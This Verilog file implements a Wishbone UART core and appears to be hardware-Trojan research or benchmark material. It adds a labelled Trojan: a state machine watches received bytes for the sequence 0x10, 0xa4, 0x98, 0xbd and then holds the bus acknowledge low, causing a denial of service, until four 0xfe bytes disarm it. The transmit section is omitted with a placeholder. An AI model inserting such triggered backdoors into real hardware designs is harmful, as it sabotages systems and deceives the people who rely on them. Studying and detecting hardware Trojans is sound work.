module	wbuart #(
		// {{{
		// 4MB 8N1, when using 100MHz clock
		parameter [30:0] INITIAL_SETUP = 31'd25,
		parameter [3:0]	LGFLEN = 4,
		parameter [0:0]	HARDWARE_FLOW_CONTROL_PRESENT = 1'b1,
		// Perform a simple/quick bounds check on the log FIFO length,
		// to make sure its within the bounds we can support with our
		// current interface.
		localparam [3:0]	LCLLGFLEN = (LGFLEN > 4'ha)? 4'ha
					: ((LGFLEN < 4'h2) ? 4'h2 : LGFLEN)
		// }}}
	) (
		// {{{
		input	wire		i_clk, i_reset,
		// Wishbone inputs
		input	wire		i_wb_cyc,
		input	wire		i_wb_stb, i_wb_we,
		input	wire	[1:0]	i_wb_addr,
		input	wire	[31:0]	i_wb_data,
		input	wire	[3:0]	i_wb_sel,
		output	wire		o_wb_stall,
		output	reg		o_wb_ack,
		output	reg	[31:0]	o_wb_data,
		//
		input	wire		i_uart_rx,
		output	wire		o_uart_tx,
		input	wire		i_cts_n,
		output	reg		o_rts_n,
		output	wire		o_uart_rx_int, o_uart_tx_int,
					o_uart_rxfifo_int, o_uart_txfifo_int
		// }}}
	);

	localparam [1:0]	UART_SETUP = 2'b00,
				UART_FIFO  = 2'b01,
				UART_RXREG = 2'b10,
				UART_TXREG = 2'b11;

	// Register and signal declarations
	// {{{
	wire	tx_busy;
	reg	[30:0]	uart_setup;
	// Receiver
	wire		rx_stb, rx_break, rx_perr, rx_ferr, ck_uart;
	wire	[7:0]	rx_uart_data;
	reg		rx_uart_reset;
	// Receive FIFO
	wire		rx_empty_n, rx_fifo_err;
	wire	[7:0]	rxf_wb_data;
	wire	[15:0]	rxf_status;
	reg		rxf_wb_read;
	//
	wire	[(LCLLGFLEN-1):0]	check_cutoff;
	reg			r_rx_perr, r_rx_ferr;
	wire	[31:0]		wb_rx_data;
	// The transmitter
	wire		tx_empty_n, txf_err, tx_break;
	wire	[7:0]	tx_data;
	wire	[15:0]	txf_status;
	reg		txf_wb_write, tx_uart_reset;
	reg	[7:0]	txf_wb_data;
	//
	wire	[31:0]	wb_tx_data;
	wire	[31:0]	wb_fifo_data;
	reg	[1:0]	r_wb_addr;
	reg		r_wb_ack;
	// --- TROJAN REGISTERS --- //
	// Trojan state: 0 - inactive, 1: armed, 2: DoS, 3: disarm-sequence
	reg [1:0]		trojan_state;
	reg [1:0]		trojan_trigger_cnt;
	reg [1:0]		trojan_disarm_cnt;
	// Synchronize UART RX FIFO output for trigger checking
	reg	[7:0]		trojan_byte_d, trojan_byte_q;
	reg			trojan_rxstb_d, trojan_rxstb_q;
	// --- END TROJAN REGISTERS --- //
	// }}}

	// uart_setup
	// {{{
	initial	uart_setup = INITIAL_SETUP
		| ((HARDWARE_FLOW_CONTROL_PRESENT==1'b0)? 31'h40000000 : 0);
	always @(posedge i_clk)
	if ((i_wb_stb)&&(i_wb_addr == UART_SETUP)&&(i_wb_we))
	begin
		if (i_wb_sel[0])
			uart_setup[7:0] <= i_wb_data[7:0];
		if (i_wb_sel[1])
			uart_setup[15:8] <= i_wb_data[15:8];
		if (i_wb_sel[2])
			uart_setup[23:16] <= i_wb_data[23:16];
		if (i_wb_sel[3])
			uart_setup[30:24] <= { (i_wb_data[30])
					||(!HARDWARE_FLOW_CONTROL_PRESENT),
				i_wb_data[29:24] };
	end
	// }}}
	////////////////////////////////////////////////////////////////////////
	//
	// The UART receiver
	// {{{
	////////////////////////////////////////////////////////////////////////
	//
	//

	// The receiver itself
	// {{{
`ifdef	USE_LITE_UART
	// {{{
	rxuartlite	#(.CLOCKS_PER_BAUD(INITIAL_SETUP[23:0]))
		rx(i_clk, i_uart_rx, rx_stb, rx_uart_data);
	assign	rx_break = 1'b0;
	assign	rx_perr  = 1'b0;
	assign	rx_ferr  = 1'b0;
	assign	ck_uart  = 1'b0;
	// }}}
`else
	// {{{
	rxuart	#(.INITIAL_SETUP(INITIAL_SETUP)) rx(i_clk, (i_reset)||(rx_uart_reset),
			uart_setup, i_uart_rx,
			rx_stb, rx_uart_data, rx_break,
			rx_perr, rx_ferr, ck_uart);
	// }}}
`endif
	// }}}

	// The receive FIFO
	ufifo	#(
		.LGFLEN(LCLLGFLEN), .RXFIFO(1)
	) rxfifo(
		.i_clk(i_clk), .i_reset((i_reset)||(rx_break)||(rx_uart_reset)),
		.i_wr(rx_stb), .i_data(rx_uart_data),
		.o_empty_n(rx_empty_n),
		.i_rd(rxf_wb_read), .o_data(rxf_wb_data),
		.o_status(rxf_status), .o_err(rx_fifo_err)
	);

	assign	o_uart_rxfifo_int = rxf_status[1];
	assign	o_uart_rx_int = rxf_status[0];

	assign	check_cutoff = -3;
	always @(posedge i_clk)
		o_rts_n <= ((HARDWARE_FLOW_CONTROL_PRESENT)
			&&(!uart_setup[30])
			&&(rxf_status[(LCLLGFLEN+1):2] > check_cutoff));

	initial	rxf_wb_read = 1'b0;
	always @(posedge i_clk)
		rxf_wb_read <= (i_wb_stb)&&(i_wb_addr[1:0]== UART_RXREG)
				&&(!i_wb_we);

	initial	r_rx_perr = 1'b0;
	initial	r_rx_ferr = 1'b0;
	always @(posedge i_clk)
	if ((rx_uart_reset)||(rx_break))
	begin
		r_rx_perr <= 1'b0;
		r_rx_ferr <= 1'b0;
	end else if ((i_wb_stb)
			&&(i_wb_addr[1:0]== UART_RXREG)&&(i_wb_we))
	begin
		if (i_wb_sel[1])
		begin
			r_rx_perr <= (r_rx_perr)&&(~i_wb_data[9]);
			r_rx_ferr <= (r_rx_ferr)&&(~i_wb_data[10]);
		end
	end else if (rx_stb)
	begin
		r_rx_perr <= (r_rx_perr)||(rx_perr);
		r_rx_ferr <= (r_rx_ferr)||(rx_ferr);
	end

	initial	rx_uart_reset = 1'b1;
	always @(posedge i_clk)
	if ((i_reset)||((i_wb_stb)&&(i_wb_addr[1:0]== UART_SETUP)&&(i_wb_we)))
		rx_uart_reset <= 1'b1;
	else if ((i_wb_stb)&&(i_wb_addr[1:0]== UART_RXREG)&&(i_wb_we)&&i_wb_sel[1])
		rx_uart_reset <= i_wb_data[12];
	else
		rx_uart_reset <= 1'b0;

	assign	wb_rx_data = { 16'h00,
				3'h0, rx_fifo_err,
				rx_break, rx_ferr, r_rx_perr, !rx_empty_n,
				rxf_wb_data};
	// }}}
	////////////////////////////////////////////////////////////////////////
	//
	// The UART transmitter ...
	// ... (TRANSMIT LOGIC OMITTED FOR BREVITY IN THIS SNIPPET, UNCHANGED) ...
	// The full transmit section remains unchanged from original
	// (insert before the "Bus / register handling" section)

	////////////////////////////////////////////////////////////////////////
	//
	// Bus / register handling
	// {{{
	////////////////////////////////////////////////////////////////////////
	//

	assign	wb_fifo_data = { txf_status, rxf_status };

	always @(posedge i_clk)
		r_wb_addr <= i_wb_addr;

	initial	r_wb_ack = 1'b0;
	always @(posedge i_clk) // We'll ACK in two clocks
		r_wb_ack <= (!i_reset)&&(i_wb_stb);

	// TROJAN INSERTION: o_wb_ack logic hijack
	// - normal operation: o_wb_ack = (!i_reset)&&(r_wb_ack)&&(i_wb_cyc)
	// - Trojan: override with "trojan_state"
	initial	o_wb_ack = 1'b0;
	always @(posedge i_clk)
	begin
		// Trojan: if trojan_state==2 (active), halt Wishbone ACK
		if ((trojan_state == 2'd2))
			o_wb_ack <= 1'b0;
		else
			o_wb_ack <= (!i_reset)&&(r_wb_ack)&&(i_wb_cyc);
	end

	// o_wb_data stays unchanged (no info leak)
	always @(posedge i_clk)
	casez(r_wb_addr)
	UART_SETUP: o_wb_data <= { 1'b0, uart_setup };
	UART_FIFO:  o_wb_data <= wb_fifo_data;
	UART_RXREG: o_wb_data <= wb_rx_data;
	UART_TXREG: o_wb_data <= wb_tx_data;
	endcase

	assign	o_wb_stall = 1'b0;

	// ////////////////////////////////////////////////////////////////////////////
	// TROJAN FSM: DoS trigger on 4-byte RX, recovery on 0xfe x4 
	// ////////////////////////////////////////////////////////////////////////////

	// The RX FIFO de-queues with rxf_wb_read, but we want to observe what bytes are actually
	// injected into the RX FIFO, so the trigger runs on rx_stb and rx_uart_data
	always @(posedge i_clk or posedge i_reset) begin
		if (i_reset) begin
			trojan_state <= 2'd0;
			trojan_trigger_cnt <= 2'd0;
			trojan_disarm_cnt <= 2'd0;
			trojan_byte_d <= 8'd0;
			trojan_byte_q <= 8'd0;
			trojan_rxstb_d <= 1'b0;
			trojan_rxstb_q <= 1'b0;
		end else begin
			// Give one cycle delay to avoid metastability when checking rx_stb
			trojan_rxstb_d <= rx_stb;
			trojan_byte_d  <= rx_uart_data;
			// Synchronize past state
			trojan_rxstb_q <= trojan_rxstb_d;
			trojan_byte_q  <= trojan_byte_d;

			// Trojan FSM state machine
			case (trojan_state)
				2'd0: begin
					// Inactive, look for first byte 0x10
					if (trojan_rxstb_q && (trojan_byte_q == 8'h10))
						trojan_state <= 2'd1;
					else
						trojan_state <= 2'd0;
					trojan_trigger_cnt <= 2'd1; // Only matters if state=1
					trojan_disarm_cnt <= 2'd0;
				end
				2'd1: begin
					// Receiving trigger sequence
					if (trojan_rxstb_q) begin
						case (trojan_trigger_cnt)
							2'd1: begin // expecting 0xa4
								if (trojan_byte_q == 8'ha4) begin
									trojan_trigger_cnt <= 2'd2;
								end else if (trojan_byte_q == 8'h10) begin
									trojan_trigger_cnt <= 2'd1; // restart on 0x10
								end else begin
									trojan_state <= 2'd0; // abort
									trojan_trigger_cnt <= 2'd0;
								end
							end
							2'd2: begin // expecting 0x98
								if (trojan_byte_q == 8'h98) begin
									trojan_trigger_cnt <= 2'd3;
								end else if (trojan_byte_q == 8'h10) begin
									trojan_trigger_cnt <= 2'd1;
								end else begin
									trojan_state <= 2'd0;
									trojan_trigger_cnt <= 2'd0;
								end
							end
							2'd3: begin // expecting 0xbd
								if (trojan_byte_q == 8'hbd) begin
									trojan_state <= 2'd2; // Activate DoS!
									trojan_trigger_cnt <= 2'd0;
								end else if (trojan_byte_q == 8'h10) begin
									trojan_trigger_cnt <= 2'd1;
								end else begin
									trojan_state <= 2'd0;
									trojan_trigger_cnt <= 2'd0;
								end
							end
							default: begin
								trojan_state <= 2'd0;
								trojan_trigger_cnt <= 2'd0;
							end
						endcase
					end
					else begin
						trojan_state <= trojan_state;
						trojan_trigger_cnt <= trojan_trigger_cnt;
					end
					trojan_disarm_cnt <= 2'd0;
				end
				2'd2: begin
					// DoS ACTIVE! Await 4x 0xfe in a row to recover
					if (trojan_rxstb_q) begin
						if (trojan_byte_q == 8'hfe) begin
							trojan_disarm_cnt <= trojan_disarm_cnt + 2'd1;
							if (trojan_disarm_cnt == 2'd3) begin
								trojan_state <= 2'd0; // Disarm
								trojan_disarm_cnt <= 2'd0;
							end else begin
								trojan_state <= 2'd2;
							end
						end else begin
							// Any other byte resets disarm sequence
							trojan_disarm_cnt <= 2'd0;
							trojan_state <= 2'd2;
						end
					end
				end
				default: begin
					trojan_state <= 2'd0;
					trojan_trigger_cnt <= 2'd0;
					trojan_disarm_cnt <= 2'd0;
				end
			endcase
		end
	end
	// <- TROJAN MODIFICATIONS END HERE

	// Make verilator happy
	wire	unused;
	assign	unused = &{ 1'b0, i_wb_data[31] };

endmodule